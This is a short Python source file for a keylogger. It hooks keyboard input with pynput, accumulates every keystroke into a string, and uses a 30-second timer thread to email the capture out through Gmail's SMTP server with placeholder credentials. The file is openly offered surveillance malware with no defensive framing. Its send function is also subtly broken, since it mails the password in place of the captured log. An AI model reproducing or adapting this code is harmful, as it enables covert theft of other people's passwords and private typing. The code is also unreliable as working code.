import pynput.keyboard
import smtplib
import time
import threading
#from pynput import keyboard

log = " "

def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        #log = log.encode("utf-8") + key.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)



def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,password)
    email_server.quit()


#def printer():
    ##global log
    #with open("logger.txt","w",encoding="utf-8") as dosya:
        #dosya.write(log)



keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    #printer()
    send_email("email","password",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

with keylogger_listener:
    thread_function()
    keylogger_listener.join()

